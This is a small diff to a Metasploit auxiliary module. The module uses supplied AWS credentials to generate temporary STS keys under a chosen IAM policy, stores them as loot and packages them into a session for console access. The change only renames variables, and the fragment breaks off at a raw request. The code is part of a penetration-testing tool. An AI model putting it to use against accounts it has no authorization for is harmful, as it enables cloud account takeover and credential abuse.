@@ -48,14 +48,14 @@ class MetasploitModule < Msf::Auxiliary
     doc = call_sts(creds, 'Action' => action, 'Name' => datastore['CONSOLE_NAME'], 'Policy' => URI.encode(datastore['IAM_POLICY']))
     doc = print_results(doc, action)
     return if doc.nil?
-    path = store_loot(datastore['ACCESS_KEY'], 'text/plain', datastore['RHOST'], doc.to_json)
+    path = store_loot(datastore['AccessKeyId'], 'text/plain', datastore['RHOST'], doc.to_json)
     print_good("Generated temp API keys stored at: " + path)
 
-    creds = doc.fetch('Credentials')
+    tmp_creds = doc.fetch('Credentials')
     session_json = {
-      sessionId: creds.fetch('AccessKeyId'),
-      sessionKey: creds.fetch('SecretAccessKey'),
-      sessionToken: creds.fetch('SessionToken')
+      sessionId: tmp_creds.fetch('AccessKeyId'),
+      sessionKey: tmp_creds.fetch('SecretAccessKey'),
+      sessionToken: tmp_creds.fetch('SessionToken')
     }.to_json
 
     resp = send_request_raw(
